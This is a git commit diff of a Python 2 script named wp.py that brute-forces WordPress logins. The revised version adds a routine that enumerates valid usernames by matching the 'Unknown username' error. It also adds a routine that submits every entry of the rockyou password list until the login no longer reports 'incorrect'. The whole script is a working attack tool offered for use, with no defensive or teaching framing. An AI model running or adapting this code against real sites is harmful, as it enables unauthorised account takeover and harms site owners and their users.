629f5ea62f3e8daebf1d7728063908e1e1fccbe5
yousef <54207974+7hj4@users.noreply.github.com>
2022-01-11 15:24:43 +0300

    Update wp.py

--- wp.py
+++ wp.py
@@ -1,5 +1,9 @@
 #usr/bin/python2
 
+#testing for python 2.7.18
+
+#update tools can brute force username or password
+
 import sys
 import requests
 import os
@@ -9,32 +13,60 @@ os.system("cls")
 os.system("clear")
 
 logo = '''
-                 ########################################
 
-                    ------- WordPress Bute Force -------
-            Note : It is necessary to enter the correct UserName
-                           Twitter : y0usef_11
-
-                 ########################################
+###################################
+#
+####### Wordpress brute force ##### 
+          twitter: y0usef_11
+###################################
+            
 '''
 
-print logo
+print (logo)
 
-url = raw_input("input url ==> ")
-username = raw_input("input username ==> ") # It is necessary to enter the correct UserName
-list_password = raw_input("input list password ==> ") # list text file
-file = open(list_password,'r')
-for line in file:
-    remove = line.rstrip("\n")
-    data = {'log':username,'pwd':remove}
-    re = requests.post(url,data=data)
+#function check for username
 
-    txt = re.content
+def check_username():
+    url = raw_input("input url : ")
+    users = raw_input("Enter users list : ") # list users text file
+    files = open(users,'r')
+    for line in files:
+        remove = line.rstrip("\n")
+        data = {'log':remove,'pwd':'test'}
+        re = requests.post(url,data=data)
 
-    x = txt.find("The password you entered for the username") # Here it searches for response in this text means an error login is being shown
+        txt = re.content
 
-    if x == -1:
-        print("Password is Successfully ==> ", data)
-        break
-    else:
-        print("Password not correct ", data)
+        if "Unknown username" in txt:
+            print(" [-] Username incorrect : " + remove)
+        else:
+            print(" [+] Username correct : " +  remove)
+            break
+            
+
+#function check for password
+
+def check_password():
+     url = raw_input("Enter url : ")
+     username = raw_input("Enter username : ") # username 
+     print(" [+] Getting list Password rockyou")
+     files = open('/usr/share/wordlists/rockyou.txt','r')
+     for line in files:
+         remove = line.rstrip("\n")
+         data = {'log':username,'pwd':remove}
+         re = requests.post(url,data=data)
+
+         txt = re.content
+
+         if "incorrect" in txt:
+             print(" [-] password incorrect : " + remove)
+         else:
+             print(" [+] password correct : " +  remove)
+             break
+
+number = input(" [+] What is Bute Force username enter 1 or password enter 2 : ")
+
+if number == 1:
+    check_username()
+elif number == 2:
+    check_password()
